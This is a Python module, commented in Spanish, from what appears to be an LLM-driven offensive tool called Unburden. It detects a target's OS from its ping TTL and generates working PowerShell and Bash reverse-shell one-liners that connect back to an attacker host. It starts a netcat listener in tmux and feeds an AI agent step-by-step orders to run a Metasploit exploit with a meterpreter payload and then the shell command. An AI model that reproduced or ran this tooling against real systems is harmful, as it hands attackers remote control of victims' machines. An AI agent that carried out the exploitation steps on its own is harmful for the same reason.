"""
Shell Handler para Unburden v3
Maneja detección de SO por TTL y generación de comandos de reverse shell
"""
import re
import asyncio
import subprocess
import logging
from typing import Tuple, Dict, Optional
from datetime import datetime

logger = logging.getLogger(__name__)


class ShellHandler:
    """
    Handler para gestionar reverse shells con detección de SO por TTL
    """

    # Palabras clave que indican solicitud de reverse shell
    SHELL_KEYWORDS = [
        "reverse shell",
        "reverseshell",
        "dame una shell",
        "entrégame una shell",
        "entregame una shell",
        "dame shell",
        "shell inversa",
        "shell reversa"
    ]

    def __init__(self):
        """Inicializa el handler de shells"""
        self.active_sessions: Dict[str, Dict] = {}

    @staticmethod
    def detect_shell_request(message: str) -> bool:
        """
        Detecta si un mensaje contiene solicitud de reverse shell

        Args:
            message: Mensaje del usuario

        Returns:
            True si detecta solicitud de shell
        """
        message_lower = message.lower()
        for keyword in ShellHandler.SHELL_KEYWORDS:
            if keyword in message_lower:
                logger.info(f"Shell request detected: keyword '{keyword}' found")
                return True
        return False

    @staticmethod
    async def detect_os_by_ttl(target_ip: str) -> Tuple[str, int, bool]:
        """
        Detecta el sistema operativo mediante TTL de ping

        Args:
            target_ip: IP de la víctima

        Returns:
            Tuple (os_type, ttl, success)
            - os_type: 'windows', 'linux', o 'unknown'
            - ttl: Valor TTL detectado
            - success: True si ping fue exitoso
        """
        try:
            # Ejecutar ping en un thread para no bloquear el event loop
            result = await asyncio.to_thread(
                subprocess.run,
                ['ping', '-c', '1', '-W', '5', target_ip],
                capture_output=True,
                text=True,
                timeout=6
            )

            # Extraer TTL del output
            # Formato: "ttl=64" o "TTL=128"
            ttl_match = re.search(r'ttl=(\d+)', result.stdout, re.IGNORECASE)

            if not ttl_match:
                logger.warning(f"TTL not found in ping output for {target_ip}")
                return 'unknown', 0, False

            ttl = int(ttl_match.group(1))
            logger.info(f"Detected TTL={ttl} for {target_ip}")

            # Determinar SO basado en rangos de TTL
            if 120 <= ttl <= 130:
                os_type = 'windows'
            elif 60 <= ttl <= 65:
                os_type = 'linux'
            else:
                os_type = 'unknown'

            logger.info(f"OS detected: {os_type} (TTL={ttl})")
            return os_type, ttl, True

        except subprocess.TimeoutExpired:
            logger.error(f"Ping timeout for {target_ip}")
            return 'unknown', 0, False
        except Exception as e:
            logger.error(f"Error detecting OS by TTL: {e}")
            return 'unknown', 0, False

    @staticmethod
    def generate_powershell_reverse_shell(lhost: str, lport: int) -> str:
        """
        Genera comando PowerShell one-liner para reverse shell

        Args:
            lhost: IP del atacante
            lport: Puerto del listener

        Returns:
            Comando PowerShell completo
        """
        # PowerShell one-liner optimizado
        ps_command = f"""powershell -c "$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'>';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()" """

        return ps_command.strip()

    @staticmethod
    def generate_bash_reverse_shell(lhost: str, lport: int) -> str:
        """
        Genera comando Bash one-liner para reverse shell

        Args:
            lhost: IP del atacante
            lport: Puerto del listener

        Returns:
            Comando Bash completo
        """
        bash_command = f"""bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" """

        return bash_command.strip()

    @staticmethod
    async def create_tmux_session(lhost: str, lport: int) -> Tuple[str, str, bool]:
        """
        Crea sesión tmux con netcat listener

        Args:
            lhost: IP del atacante (no usado, pero para consistencia de API)
            lport: Puerto del listener

        Returns:
            Tuple (session_name, command_output, success)
        """
        try:
            # Generar nombre de sesión único
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            session_name = f"Unburden-shell-{timestamp}"

            # Verificar si tmux está instalado
            tmux_check = await asyncio.to_thread(
                subprocess.run,
                ['which', 'tmux'],
                capture_output=True,
                timeout=2
            )

            if tmux_check.returncode != 0:
                logger.error("tmux not installed")
                return "", "ERROR: tmux not installed on system", False

            # Crear sesión tmux en background
            create_session = await asyncio.to_thread(
                subprocess.run,
                ['tmux', 'new-session', '-d', '-s', session_name],
                capture_output=True,
                text=True,
                timeout=5
            )

            if create_session.returncode != 0:
                logger.error(f"Failed to create tmux session: {create_session.stderr}")
                return "", f"ERROR: Failed to create tmux session: {create_session.stderr}", False

            # Enviar comando netcat a la sesión
            nc_command = f"nc -lvnp {lport}"
            send_keys = await asyncio.to_thread(
                subprocess.run,
                ['tmux', 'send-keys', '-t', session_name, nc_command, 'Enter'],
                capture_output=True,
                text=True,
                timeout=5
            )

            if send_keys.returncode != 0:
                logger.error(f"Failed to send keys to tmux: {send_keys.stderr}")
                return session_name, f"ERROR: Failed to start netcat: {send_keys.stderr}", False

            logger.info(f"Created tmux session '{session_name}' with netcat on port {lport}")

            return session_name, f"Listener started in tmux session '{session_name}'", True

        except subprocess.TimeoutExpired:
            logger.error("Tmux command timeout")
            return "", "ERROR: Tmux command timeout", False
        except Exception as e:
            logger.error(f"Error creating tmux session: {e}")
            return "", f"ERROR: {str(e)}", False

    @staticmethod
    def generate_shell_instructions(
        lhost: str,
        lport: int,
        os_type: str,
        session_name: str
    ) -> str:
        """
        Genera instrucciones completas para el LLM

        Args:
            lhost: IP del atacante
            lport: Puerto del listener
            os_type: Sistema operativo ('windows' o 'linux')
            session_name: Nombre de la sesión tmux

        Returns:
            Instrucciones formateadas para el LLM
        """
        # Generar comando según SO
        if os_type == 'windows':
            shell_command = ShellHandler.generate_powershell_reverse_shell(lhost, lport)
            shell_type = "PowerShell"
        elif os_type == 'linux':
            shell_command = ShellHandler.generate_bash_reverse_shell(lhost, lport)
            shell_type = "Bash"
        else:
            return "ERROR: Unknown OS type. Cannot generate shell command."

        # Formatear instrucciones para el LLM (RESTAURADO DEL COMMIT 2d6bccf QUE FUNCIONABA)
        instructions = f"""
**🎯 REVERSE SHELL LISTENER READY - CRITICAL INSTRUCTIONS**

**⚠️ IMPORTANTE - READ CAREFULLY:**
El LHOST es el mismo para exploit y listener. El LPORT es DIFERENTE: usa 4444 para el exploit y {lport} para el listener.

**EXPLOIT CONFIGURATION (METERPRETER PAYLOAD):**
- Si necesitas ejecutar un exploit primero, usa estos valores:
  - LHOST: {lhost} (LA MISMA IP configurada para el listener, NO uses otra IP)
  - LPORT: 4444 (puerto default para Meterpreter, DIFERENTE al listener)
  - Payload: windows/x64/meterpreter/reverse_tcp o windows/meterpreter/reverse_tcp
- Ejecuta el exploit y ESPERA a obtener la sesión Meterpreter

**REVERSE SHELL CONFIGURATION (NETCAT LISTENER):**
Una VEZ que tengas sesión Meterpreter, ejecutarás este comando para obtener una shell nativa:
- LHOST: {lhost}
- LPORT: {lport}
- SO Víctima: {os_type.upper()}
- Sesión Tmux: `{session_name}`

**PROCEDIMIENTO COMPLETO:**

**1. EJECUTAR EXPLOIT (si aún no tienes sesión Meterpreter):**
   - Usa run_exploit con LHOST={lhost}, LPORT=4444
   - Espera confirmación de sesión Meterpreter

**2. EJECUTAR REVERSE SHELL (un solo paso - la herramienta maneja 'shell' automáticamente):**
   Usa send_session_command con el one-liner de abajo directamente desde la sesión Meterpreter.
   **NO ejecutes 'shell' por separado** - send_session_command detecta automáticamente que es un
   reverse shell y entra al OS shell de forma no-bloqueante antes de enviar el comando.
   Ejecuta EXACTAMENTE este comando {shell_type}:
   ```
   {shell_command}
   ```

**ALTERNATIVA - Acceso manual directo a la sesión Meterpreter:**
   Si necesitas acceder interactivamente a la sesión Meterpreter desde una terminal, usa:
   ```
   attach_session_interactive(session_id)
   ```
   Y luego conecta con: tmux attach -t <nombre_sesion_retornado>

**⚠️ CRITICAL RULES:**
- **DO NOT** use LHOST={lhost} or LPORT={lport} for the exploit configuration
- **DO NOT** modify the IPs or ports in the one-liner command
- **DO NOT** add extra quotes to the command
- The command MUST be executed in ONE SINGLE LINE
- Execute the one-liner ONLY after you have a working Meterpreter session

**VERIFICATION:**
The reverse shell will automatically connect to the netcat listener running in tmux.

**To interact with the shell:**
```bash
tmux attach -t {session_name}
```

**To list tmux sessions:**
```bash
tmux ls
```

**To detach from tmux without closing the shell:**
Press: `Ctrl+B` then `D`

**NOW FOLLOW THE PROCEDURE STEP BY STEP.**
"""

        return instructions.strip()

    @staticmethod
    def validate_shell_config(config: Dict) -> Tuple[bool, str]:
        """
        Valida la configuración de shell proporcionada por el usuario

        Args:
            config: Diccionario con lhost, lport, os_type

        Returns:
            Tuple (is_valid, error_message)
        """
        # Validar presencia de campos requeridos
        if not config.get('lhost'):
            return False, "LHOST is required"

        if not config.get('lport'):
            return False, "LPORT is required"

        if not config.get('os_type'):
            return False, "OS type is required"

        # Validar formato de IP
        lhost = config['lhost']
        ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if not re.match(ip_pattern, lhost):
            return False, f"Invalid IP format: {lhost}"

        # Validar que cada octeto esté en rango 0-255
        octets = lhost.split('.')
        for octet in octets:
            if not 0 <= int(octet) <= 255:
                return False, f"IP octet out of range: {octet}"

        # Validar puerto
        try:
            lport = int(config['lport'])
            if not 1 <= lport <= 65535:
                return False, f"Port out of range (1-65535): {lport}"
        except (ValueError, TypeError):
            return False, f"Invalid port format: {config['lport']}"

        # Validar OS type
        os_type = config['os_type'].lower()
        if os_type not in ['windows', 'linux']:
            return False, f"Invalid OS type: {os_type}. Must be 'windows' or 'linux'"

        return True, ""


def detect_shell_requests_in_instructions(instructions: list) -> list:
    """
    Detecta cuáles instrucciones contienen solicitudes de reverse shell

    Args:
        instructions: Lista de objetos SequentialInstruction

    Returns:
        Lista de instrucciones que contienen solicitud de shell
    """
    shell_requests = []

    for instruction in instructions:
        if ShellHandler.detect_shell_request(instruction.content):
            shell_requests.append({
                'instruction_number': instruction.number,
                'instruction_content': instruction.content
            })

    return shell_requests
